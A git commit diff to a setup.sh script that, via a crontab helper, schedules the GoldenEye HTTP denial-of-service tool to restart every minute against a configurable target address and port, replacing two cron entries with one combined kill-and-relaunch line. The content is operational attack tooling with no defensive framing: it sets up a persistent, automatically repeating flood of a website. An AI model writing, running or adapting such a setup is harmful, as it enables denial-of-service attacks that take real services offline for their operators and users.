4bec579746a6b61eb8e0bae442d0185d34be3318
sons-of-liberty <138848803+sons-of-liberty@users.noreply.github.com>
2024-07-22 00:30:25 +0330

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -38,8 +38,7 @@ function addtocrontab () {
   local job="$frequency $command"
   cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -
 }
-addtocrontab "*/1 * * * *" "python3 /root/GoldenEye/goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode"
-addtocrontab "*/1 * * * *" "sleep 55; goldenkill"
+addtocrontab "*/1 * * * *" "goldenkill; python3 /root/GoldenEye/goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode"
 
 echo -e "${RED} Cronjob Created. ${NC}"
 echo -e "${RED} Setup Finished Successfully. Adios. ${NC}"
